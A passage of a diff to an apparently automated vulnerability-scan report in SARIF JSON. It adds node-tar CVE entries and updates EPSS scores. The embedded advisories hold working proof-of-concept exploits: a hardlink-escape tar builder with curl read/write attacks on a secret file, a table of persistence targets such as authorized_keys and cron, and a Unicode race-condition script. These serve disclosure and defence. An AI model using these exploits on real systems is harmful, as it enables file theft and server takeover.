tarHeader('d/x', 'link', '../secret.txt'),\n  Buffer.alloc(1024)\n]));\nconsole.log('Created malicious.tar');\n```\n\n#### Run\n\n```bash\n# Setup\nnpm install\necho \"DATABASE_PASSWORD=supersecret123\" > secret.txt\n\n# Terminal 1: Start server\nnode server.js\n\n# Terminal 2: Execute attack\nnode create-malicious-tar.js\ncurl -X POST --data-binary @malicious.tar http://localhost:3000/upload\n\n# READ ATTACK: Steal secret.txt content via the hardlink\ncurl http://localhost:3000/read\n# Returns: DATABASE_PASSWORD=supersecret123\n\n# WRITE ATTACK: Overwrite secret.txt through the hardlink\ncurl -X POST -d \"PWNED\" http://localhost:3000/write\n\n# Confirm secret.txt was modified\ncat secret.txt\n```\n### Impact\n\nAn attacker can craft a malicious TAR archive that, when extracted by an application using node-tar, creates hardlinks that escape the extraction directory. This enables:\n\n**Immediate (Read Attack):** If the application serves extracted files, attacker can read any file readable by the process.\n\n**Conditional (Write Attack):** If the application later writes to the hardlink path, it modifies the target file outside the extraction directory.\n\n### Remote Code Execution / Server Takeover\n\n| Attack Vector | Target File | Result |\n|--------------|-------------|--------|\n| SSH Access | `~/.ssh/authorized_keys` | Direct shell access to server |\n| Cron Backdoor | `/etc/cron.d/*`, `~/.crontab` | Persistent code execution |\n| Shell RC Files | `~/.bashrc`, `~/.profile` | Code execution on user login |\n| Web App Backdoor | Application `.js`, `.php`, `.py` files | Immediate RCE via web requests |\n| Systemd Services | `/etc/systemd/system/*.service` | Code execution on service restart |\n| User Creation | `/etc/passwd` (if running as root) | Add new privileged user |\n\n## Data Exfiltration & Corruption\n\n1. **Overwrite arbitrary files** via hardlink escape + subsequent write operations\n2. **Read sensitive files** by creating hardlinks that point outside extraction directory\n3. **Corrupt databases** and application state\n4. **Steal credentials** from config files, `.env`, secrets\n\n|                                                                                                   |\n|Package                                                                        pkg:npm/tar@6.1.11  |\n|Affected range                                                                 <7.5.7              |\n|Fixed version                                                                  7.5.7               |\n|[[CVSS Score 8.2] [CVSS Vector CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N]]                      |\n"
+              },
+              "properties": {
+                "affected_version": "<7.5.7",
+                "cvssV3": 8.2,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
+                "fixed_version": "7.5.7",
+                "purls": [
+                  "pkg:npm/tar@6.1.11"
+                ],
+                "security-severity": "8.2",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
               "id": "CVE-2025-15284",
               "name": "OsPackageVulnerability",
               "shortDescription": {
@@ -501,6 +605,32 @@
                   "pkg:npm/qs@6.13.0"
                 ],
                 "security-severity": "8.7",
+                "tags": [
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-23950",
+              "name": "OsPackageVulnerability",
+              "shortDescription": {
+                "text": "CVE-2026-23950: Improper Handling of Unicode Encoding"
+              },
+              "helpUri": "https://scout.docker.com/v/CVE-2026-23950?s=github&n=tar&t=npm&vr=%3C%3D7.5.3",
+              "help": {
+                "text": "**TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (ß) Collisions on macOS APFS\n\n**AUTHOR**: Tomás Illuminati\n\n### Details\n\nA race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently.\n\n```typescript\n// node-tar/src/path-reservations.ts (Lines 53-62)\nreserve(paths: string[], fn: Handler) {\n    paths =\n      isWindows ?\n        ['win32 parallelization disabled']\n      : paths.map(p => {\n          return stripTrailingSlashes(\n            join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS\n          ).toLowerCase()\n        })\n\n```\n\nIn MacOS the ```join(normalizeUnicode(p)), ``` FS confuses ß with ss, but this code does not. For example:\n\n``````bash\nbash-3.2$ printf \"CONTENT_SS\\n\" > collision_test_ss\nbash-3.2$ ls\ncollision_test_ss\nbash-3.2$ printf \"CONTENT_ESSZETT\\n\" > collision_test_ß\nbash-3.2$ ls -la\ntotal 8\ndrwxr-xr-x   3 testuser  staff    96 Jan 19 01:25 .\ndrwxr-x---+ 82 testuser  staff  2624 Jan 19 01:25 ..\n-rw-r--r--   1 testuser  staff    16 Jan 19 01:26 collision_test_ss\nbash-3.2$ \n``````\n\n---\n\n### PoC\n\n``````javascript\nconst tar = require('tar');\nconst fs = require('fs');\nconst path = require('path');\nconst { PassThrough } = require('stream');\n\nconst exploitDir = path.resolve('race_exploit_dir');\nif (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true });\nfs.mkdirSync(exploitDir);\n\nconsole.log('[*] Testing...');\nconsole.log(`[*] Extraction target: ${exploitDir}`);\n\n// Construct stream\nconst stream = new PassThrough();\n\nconst contentA = 'A'.repeat(1000);\nconst contentB = 'B'.repeat(1000);\n\n// Key 1: \"f_ss\"\nconst header1 = new tar.Header({\n    path: 'collision_ss',\n    mode: 0o644,\n    size: contentA.length,\n});\nheader1.encode();\n\n// Key 2: \"f_ß\"\nconst header2 = new tar.Header({\n    path: 'collision_ß',\n    mode: 0o644,\n    size: contentB.length,\n});\nheader2.encode();\n\n// Write to stream\nstream.write(header1.block);\nstream.write(contentA);\nstream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding\n\nstream.write(header2.block);\nstream.write(contentB);\nstream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding\n\n// End\nstream.write(Buffer.alloc(1024));\nstream.end();\n\n// Extract\nconst extract = new tar.Unpack({\n    cwd: exploitDir,\n    // Ensure jobs is high enough to allow parallel processing if locks fail\n    jobs: 8 \n});\n\nstream.pipe(extract);\n\nextract.on('end', () => {\n    console.log('[*] Extraction complete');\n\n    // Check what exists\n    const files = fs.readdirSync(exploitDir);\n    console.log('[*] Files in exploit dir:', files);\n    files.forEach(f => {\n        const p = path.join(exploitDir, f);\n        const stat = fs.statSync(p);\n        const content = fs.readFileSync(p, 'utf8');\n        console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}... (Length: ${content.length})`);\n    });\n\n    if (files.length === 1 || (files.length === 2 && fs.statSync(path.join(exploitDir, files[0])).ino === fs.statSync(path.join(exploitDir, files[1])).ino)) {\n        console.log('\\[*] GOOD');\n    } else {\n        console.log('[-] No collision');\n    }\n});\n\n``````\n\n---\n\n### Impact\nThis is a **Race Condition** which enables **Arbitrary File Overwrite**. This vulnerability affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `ß` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive.\n\n---\n\n### Remediation\n\nUpdate `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`.\n\nUsers who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue.\n\n---\n",
+                "markdown": "> **TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (ß) Collisions on macOS APFS\n\n**AUTHOR**: Tomás Illuminati\n\n### Details\n\nA race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently.\n\n```typescript\n// node-tar/src/path-reservations.ts (Lines 53-62)\nreserve(paths: string[], fn: Handler) {\n    paths =\n      isWindows ?\n        ['win32 parallelization disabled']\n      : paths.map(p => {\n          return stripTrailingSlashes(\n            join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS\n          ).toLowerCase()\n        })\n\n```\n\nIn MacOS the ```join(normalizeUnicode(p)), ``` FS confuses ß with ss, but this code does not. For example:\n\n``````bash\nbash-3.2$ printf \"CONTENT_SS\\n\" > collision_test_ss\nbash-3.2$ ls\ncollision_test_ss\nbash-3.2$ printf \"CONTENT_ESSZETT\\n\" > collision_test_ß\nbash-3.2$ ls -la\ntotal 8\ndrwxr-xr-x   3 testuser  staff    96 Jan 19 01:25 .\ndrwxr-x---+ 82 testuser  staff  2624 Jan 19 01:25 ..\n-rw-r--r--   1 testuser  staff    16 Jan 19 01:26 collision_test_ss\nbash-3.2$ \n``````\n\n---\n\n### PoC\n\n``````javascript\nconst tar = require('tar');\nconst fs = require('fs');\nconst path = require('path');\nconst { PassThrough } = require('stream');\n\nconst exploitDir = path.resolve('race_exploit_dir');\nif (fs.existsSync(exploitDir)) fs.rmSync(exploitDir, { recursive: true, force: true });\nfs.mkdirSync(exploitDir);\n\nconsole.log('[*] Testing...');\nconsole.log(`[*] Extraction target: ${exploitDir}`);\n\n// Construct stream\nconst stream = new PassThrough();\n\nconst contentA = 'A'.repeat(1000);\nconst contentB = 'B'.repeat(1000);\n\n// Key 1: \"f_ss\"\nconst header1 = new tar.Header({\n    path: 'collision_ss',\n    mode: 0o644,\n    size: contentA.length,\n});\nheader1.encode();\n\n// Key 2: \"f_ß\"\nconst header2 = new tar.Header({\n    path: 'collision_ß',\n    mode: 0o644,\n    size: contentB.length,\n});\nheader2.encode();\n\n// Write to stream\nstream.write(header1.block);\nstream.write(contentA);\nstream.write(Buffer.alloc(512 - (contentA.length % 512))); // Padding\n\nstream.write(header2.block);\nstream.write(contentB);\nstream.write(Buffer.alloc(512 - (contentB.length % 512))); // Padding\n\n// End\nstream.write(Buffer.alloc(1024));\nstream.end();\n\n// Extract\nconst extract = new tar.Unpack({\n    cwd: exploitDir,\n    // Ensure jobs is high enough to allow parallel processing if locks fail\n    jobs: 8 \n});\n\nstream.pipe(extract);\n\nextract.on('end', () => {\n    console.log('[*] Extraction complete');\n\n    // Check what exists\n    const files = fs.readdirSync(exploitDir);\n    console.log('[*] Files in exploit dir:', files);\n    files.forEach(f => {\n        const p = path.join(exploitDir, f);\n        const stat = fs.statSync(p);\n        const content = fs.readFileSync(p, 'utf8');\n        console.log(`File: ${f}, Inode: ${stat.ino}, Content: ${content.substring(0, 10)}... (Length: ${content.length})`);\n    });\n\n    if (files.length === 1 || (files.length === 2 && fs.statSync(path.join(exploitDir, files[0])).ino === fs.statSync(path.join(exploitDir, files[1])).ino)) {\n        console.log('\\[*] GOOD');\n    } else {\n        console.log('[-] No collision');\n    }\n});\n\n``````\n\n---\n\n### Impact\nThis is a **Race Condition** which enables **Arbitrary File Overwrite**. This vulnerability affects users and systems using **node-tar on macOS (APFS/HFS+)**. Because of using `NFD` Unicode normalization (in which `ß` and `ss` are different), conflicting paths do not have their order properly preserved under filesystems that ignore Unicode normalization (e.g., APFS (in which `ß` causes an inode collision with `ss`)). This enables an attacker to circumvent internal parallelization locks (`PathReservations`) using conflicting filenames within a malicious tar archive.\n\n---\n\n### Remediation\n\nUpdate `path-reservations.js` to use a normalization form that matches the target filesystem's behavior (e.g., `NFKD`), followed by first `toLocaleLowerCase('en')` and then `toLocaleUpperCase('en')`.\n\nUsers who cannot upgrade promptly, and who are programmatically using `node-tar` to extract arbitrary tarball data should filter out all `SymbolicLink` entries (as npm does) to defend against arbitrary file writes via this file system entry name collision issue.\n\n---\n\n|                                                                                                   |\n|Package                                                                        pkg:npm/tar@6.1.11  |\n|Affected range                                                                 <=7.5.3             |\n|Fixed version                                                                  7.5.4               |\n|[[CVSS Score 8.8] [CVSS Vector CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L]]                      |\n"
+              },
+              "properties": {
+                "affected_version": "<=7.5.3",
+                "cvssV3": 8.8,
+                "cvssV3_severity": "HIGH",
+                "cvssV3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L",
+                "fixed_version": "7.5.4",
+                "purls": [
+                  "pkg:npm/tar@6.1.11"
+                ],
+                "security-severity": "8.8",
                 "tags": [
                   "HIGH"
                 ]
@@ -8087,7 +8217,7 @@
           "kind": "fail",
           "level": "note",
           "message": {
-            "text": "Vulnerability    :CVE-2010-0928                                                                            \nSeverity         :LOW                                                                                      \nPackage          :pkg:deb/debian/openssl@1.1.1n-0%2Bdeb10u6?os_distro=buster&os_name=debian&os_version=10  \nAffected range   :>=1.1.1n-0+deb10u3                                                                       \nFixed version    :not fixed                                                                                \nEPSS Score       :0.001190                                                                                 \nEPSS Percentile  :0.315770                                                                                 \n"
+            "text": "Vulnerability    :CVE-2010-0928                                                                            \nSeverity         :LOW                                                                                      \nPackage          :pkg:deb/debian/openssl@1.1.1n-0%2Bdeb10u6?os_distro=buster&os_name=debian&os_version=10  \nAffected range   :>=1.1.1n-0+deb10u3                                                                       \nFixed version    :not fixed                                                                                \nEPSS Score       :0.000940                                                                                 \nEPSS Percentile  :0.265870                                                                                 \n"
           },
           "locations": [
             {
@@ -19062,7 +19192,7 @@
           "kind": "fail",
           "level": "note",
           "message": {
-            "text": "Vulnerability    :CVE-2023-42282    \nSeverity         :LOW               \nPackage          :pkg:npm/ip@2.0.0  \nAffected range   :=2.0.0            \nFixed version    :2.0.1             \nEPSS Score       :0.005540          \nEPSS Percentile  :0.673940          \n"
+            "text": "Vulnerability    :CVE-2023-42282    \nSeverity         :LOW               \nPackage          :pkg:npm/ip@2.0.0  \nAffected range   :=2.0.0            \nFixed version    :2.0.1             \nEPSS Score       :0.005540          \nEPSS Percentile  :0.675000          \n"
           },
           "locations": [
             {
@@ -19080,25 +19210,7 @@
           "kind": "fail",
           "level": "note",
           "message": {
-            "text": "Vulnerability    :CVE-2025-5889                                                                                                                                                                   \nSeverity         :LOW                                                                                                                                                                             \nPackage          :pkg:npm/brace-expansion@2.0.1                                                                                                                                                   \nAffected range   :>=2.0.0,<=2.0.1                                                                                                                                                                 \nFixed version    :2.0.2                                                                                                                                                                           \nCVSS Score       :1.3                                                                                                                                                                             \nCVSS Vector      :CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X  \nEPSS Score       :0.000170                                                                                                                                                                        \nEPSS Percentile  :0.035210                                                                                                                                                                        \n"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "/usr/local/lib/node_modules/npm/node_modules/brace-expansion/package.json"
-                }
-              }
-            }
-          ]
-        },
-        {
-          "ruleId": "CVE-2025-5889",
-          "ruleIndex": 12,
-          "kind": "fail",
-          "level": "note",
-          "message": {
-            "text": "Vulnerability    :CVE-2025-5889                                                                                                                                                                   \nSeverity         :LOW                                                                                                                                                                             \nPackage          :pkg:npm/brace-expansion@1.1.11                                                                                                                                                  \nAffected range   :>=1.0.0,<=1.1.11                                                                                                                                                                \nFixed version    :1.1.12                                                                                                                                                                          \nCVSS Score       :1.3                                                                                                                                                                             \nCVSS Vector      :CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X  \nEPSS Score       :0.000170                                                                                                                                                                        \nEPSS Percentile  :0.035210                                                                                                                                                                        \n"
+            "text": "Vulnerability    :CVE-2025-5889                                                                                                                                                                   \nSeverity         :LOW                                                                                                                                                                             \nPackage          :pkg:npm/brace-expansion@1.1.11                                                                                                                                                  \nAffected range   :>=1.0.0,<=1.1.11                                                                                                                                                                \nFixed version    :1.1.12                                                                                                                                                                          \nCVSS Score       :1.3                                                                                                                                                                             \nCVSS Vector      :CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X  \nEPSS Score       :0.000190                                                                                                                                                                        \nEPSS Percentile  :0.041060                                                                                                                                                                        \n"
           },
           "locations": [
             {
@@ -19118,12 +19230,48 @@
           ]
         },
         {
-          "ruleId": "CVE-2020-28500",
+          "ruleId": "CVE-2025-5889",
+          "ruleIndex": 12,
+          "kind": "fail",
+          "level": "note",
+          "message": {
+            "text": "Vulnerability    :CVE-2025-5889                                                                                                                                                                   \nSeverity         :LOW                                                                                                                                                                             \nPackage          :pkg:npm/brace-expansion@2.0.1                                                                                                                                                   \nAffected range   :>=2.0.0,<=2.0.1                                                                                                                                                                 \nFixed version    :2.0.2                                                                                                                                                                           \nCVSS Score       :1.3                                                                                                                                                                             \nCVSS Vector      :CVSS:4.0/AV:N/AC:H/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:P/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X  \nEPSS Score       :0.000190                                                                                                                                                                        \nEPSS Percentile  :0.041060                                                                                                                                                                        \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/node_modules/npm/node_modules/brace-expansion/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-24001",
           "ruleIndex": 13,
+          "kind": "fail",
+          "level": "note",
+          "message": {
+            "text": "Vulnerability    :CVE-2026-24001                                                       \nSeverity         :LOW                                                                  \nPackage          :pkg:npm/diff@5.1.0                                                   \nAffected range   :>=5.0.0,<5.2.2                                                       \nFixed version    :5.2.2                                                                \nCVSS Score       :2.7                                                                  \nCVSS Vector      :CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N/E:U  \nEPSS Score       :0.000560                                                             \nEPSS Percentile  :0.174370                                                             \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/node_modules/npm/node_modules/diff/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2020-28500",
+          "ruleIndex": 14,
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "Vulnerability    :CVE-2020-28500                                \nSeverity         :MEDIUM                                        \nPackage          :pkg:npm/lodash@4.17.20                        \nAffected range   :>=4.0.0,<4.17.21                              \nFixed version    :4.17.21                                       \nCVSS Score       :5.3                                           \nCVSS Vector      :CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L  \nEPSS Score       :0.002450                                      \nEPSS Percentile  :0.476270                                      \n"
+            "text": "Vulnerability    :CVE-2020-28500                                \nSeverity         :MEDIUM                                        \nPackage          :pkg:npm/lodash@4.17.20                        \nAffected range   :>=4.0.0,<4.17.21                              \nFixed version    :4.17.21                                       \nCVSS Score       :5.3                                           \nCVSS Vector      :CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L  \nEPSS Score       :0.002450                                      \nEPSS Percentile  :0.474870                                      \n"
           },
           "locations": [
             {
@@ -19137,11 +19285,11 @@
         },
         {
           "ruleId": "CVE-2019-3902",
-          "ruleIndex": 14,
+          "ruleIndex": 15,
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "Vulnerability    :CVE-2019-3902                                 \nSeverity         :MEDIUM                                        \nPackage          :pkg:pypi/mercurial@4.8.2                      \nAffected range   :<4.9                                          \nFixed version    :4.9                                           \nCVSS Score       :5.9                                           \nCVSS Vector      :CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N  \nEPSS Score       :0.007640                                      \nEPSS Percentile  :0.728290                                      \n"
+            "text": "Vulnerability    :CVE-2019-3902                                 \nSeverity         :MEDIUM                                        \nPackage          :pkg:pypi/mercurial@4.8.2                      \nAffected range   :<4.9                                          \nFixed version    :4.9                                           \nCVSS Score       :5.9                                           \nCVSS Vector      :CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N  \nEPSS Score       :0.007640                                      \nEPSS Percentile  :0.729500                                      \n"
           },
           "locations": [
             {
@@ -19155,11 +19303,11 @@
         },
         {
           "ruleId": "CVE-2024-28863",
-          "ruleIndex": 15,
+          "ruleIndex": 16,
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "Vulnerability    :CVE-2024-28863                                \nSeverity         :MEDIUM                                        \nPackage          :pkg:npm/tar@6.1.11                            \nAffected range   :<6.2.1                                        \nFixed version    :6.2.1                                         \nCVSS Score       :6.5                                           \nCVSS Vector      :CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H  \nEPSS Score       :0.004630                                      \nEPSS Percentile  :0.635750                                      \n"
+            "text": "Vulnerability    :CVE-2024-28863                                \nSeverity         :MEDIUM                                        \nPackage          :pkg:npm/tar@6.1.11                            \nAffected range   :<6.2.1                                        \nFixed version    :6.2.1                                         \nCVSS Score       :6.5                                           \nCVSS Vector      :CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H  \nEPSS Score       :0.004500                                      \nEPSS Percentile  :0.631370                                      \n"
           },
           "locations": [
             {
@@ -19172,12 +19320,30 @@
           ]
         },
         {
+          "ruleId": "CVE-2025-13465",
+          "ruleIndex": 17,
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Vulnerability    :CVE-2025-13465                                                       \nSeverity         :MEDIUM                                                               \nPackage          :pkg:npm/lodash@4.17.20                                               \nAffected range   :>=4.0.0,<=4.17.22                                                    \nFixed version    :4.17.23                                                              \nCVSS Score       :6.9                                                                  \nCVSS Vector      :CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:L/SC:H/SI:H/SA:H/E:P  \nEPSS Score       :0.000600                                                             \nEPSS Percentile  :0.186880                                                             \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/app/node_modules/lodash/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
           "ruleId": "CVE-2021-23337",
-          "ruleIndex": 16,
+          "ruleIndex": 18,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "Vulnerability    :CVE-2021-23337                                \nSeverity         :HIGH                                          \nPackage          :pkg:npm/lodash@4.17.20                        \nAffected range   :<4.17.21                                      \nFixed version    :4.17.21                                       \nCVSS Score       :7.2                                           \nCVSS Vector      :CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H  \nEPSS Score       :0.005170                                      \nEPSS Percentile  :0.660450                                      \n"
+            "text": "Vulnerability    :CVE-2021-23337                                \nSeverity         :HIGH                                          \nPackage          :pkg:npm/lodash@4.17.20                        \nAffected range   :<4.17.21                                      \nFixed version    :4.17.21                                       \nCVSS Score       :7.2                                           \nCVSS Vector      :CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H  \nEPSS Score       :0.007410                                      \nEPSS Percentile  :0.724810                                      \n"
           },
           "locations": [
             {
@@ -19191,11 +19357,11 @@
         },
         {
           "ruleId": "CVE-2022-25883",
-          "ruleIndex": 17,
+          "ruleIndex": 19,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "Vulnerability    :CVE-2022-25883                                \nSeverity         :HIGH                                          \nPackage          :pkg:npm/semver@7.3.7                          \nAffected range   :>=7.0.0,<7.5.2                                \nFixed version    :7.5.2                                         \nCVSS Score       :7.5                                           \nCVSS Vector      :CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  \nEPSS Score       :0.003300                                      \nEPSS Percentile  :0.554370                                      \n"
+            "text": "Vulnerability    :CVE-2022-25883                                \nSeverity         :HIGH                                          \nPackage          :pkg:npm/semver@7.3.7                          \nAffected range   :>=7.0.0,<7.5.2                                \nFixed version    :7.5.2                                         \nCVSS Score       :7.5                                           \nCVSS Vector      :CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  \nEPSS Score       :0.005810                                      \nEPSS Percentile  :0.683490                                      \n"
           },
           "locations": [
             {
@@ -19209,11 +19375,11 @@
         },
         {
           "ruleId": "CVE-2024-29415",
-          "ruleIndex": 18,
+          "ruleIndex": 20,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "Vulnerability    :CVE-2024-29415                                \nSeverity         :HIGH                                          \nPackage          :pkg:npm/ip@2.0.0                              \nAffected range   :<=2.0.1                                       \nFixed version    :not fixed                                     \nCVSS Score       :8.1                                           \nCVSS Vector      :CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H  \nEPSS Score       :0.039160                                      \nEPSS Percentile  :0.879360                                      \n"
+            "text": "Vulnerability    :CVE-2024-29415                                \nSeverity         :HIGH                                          \nPackage          :pkg:npm/ip@2.0.0                              \nAffected range   :<=2.0.1                                       \nFixed version    :not fixed                                     \nCVSS Score       :8.1                                           \nCVSS Vector      :CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H  \nEPSS Score       :0.868040                                      \nEPSS Percentile  :0.994060                                      \n"
           },
           "locations": [
             {
@@ -19226,18 +19392,72 @@
           ]
         },
         {
-          "ruleId": "CVE-2025-15284",
-          "ruleIndex": 19,
+          "ruleId": "CVE-2026-23745",
+          "ruleIndex": 21,
           "kind": "fail",
           "level": "error",
           "message": {
-            "text": "Vulnerability    :CVE-2025-15284                                                   \nSeverity         :HIGH                                                             \nPackage          :pkg:npm/qs@6.13.0                                                \nAffected range   :<6.14.1                                                          \nFixed version    :6.14.1                                                           \nCVSS Score       :8.7                                                              \nCVSS Vector      :CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N  \nEPSS Score       :0.001420                                                         \nEPSS Percentile  :0.349420                                                         \n"
+            "text": "Vulnerability    :CVE-2026-23745                                                   \nSeverity         :HIGH                                                             \nPackage          :pkg:npm/tar@6.1.11                                               \nAffected range   :<=7.5.2                                                          \nFixed version    :7.5.3                                                            \nCVSS Score       :8.2                                                              \nCVSS Vector      :CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:L/VA:N/SC:H/SI:L/SA:N  \nEPSS Score       :0.000070                                                         \nEPSS Percentile  :0.004170                                                         \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/node_modules/npm/node_modules/tar/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-24842",
+          "ruleIndex": 22,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2026-24842                                \nSeverity         :HIGH                                          \nPackage          :pkg:npm/tar@6.1.11                            \nAffected range   :<7.5.7                                        \nFixed version    :7.5.7                                         \nCVSS Score       :8.2                                           \nCVSS Vector      :CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N  \nEPSS Score       :0.000270                                      \nEPSS Percentile  :0.068680                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/node_modules/npm/node_modules/tar/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-15284",
+          "ruleIndex": 23,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2025-15284                                                   \nSeverity         :HIGH                                                             \nPackage          :pkg:npm/qs@6.13.0                                                \nAffected range   :<6.14.1                                                          \nFixed version    :6.14.1                                                           \nCVSS Score       :8.7                                                              \nCVSS Vector      :CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N  \nEPSS Score       :0.001630                                                         \nEPSS Percentile  :0.375020                                                         \n"
           },
           "locations": [
             {
               "physicalLocation": {
                 "artifactLocation": {
                   "uri": "/app/node_modules/qs/package.json"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2026-23950",
+          "ruleIndex": 24,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2026-23950                                \nSeverity         :HIGH                                          \nPackage          :pkg:npm/tar@6.1.11                            \nAffected range   :<=7.5.3                                       \nFixed version    :7.5.4                                         \nCVSS Score       :8.8                                           \nCVSS Vector      :CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:L  \nEPSS Score       :0.000150                                      \nEPSS Percentile  :0.025830                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
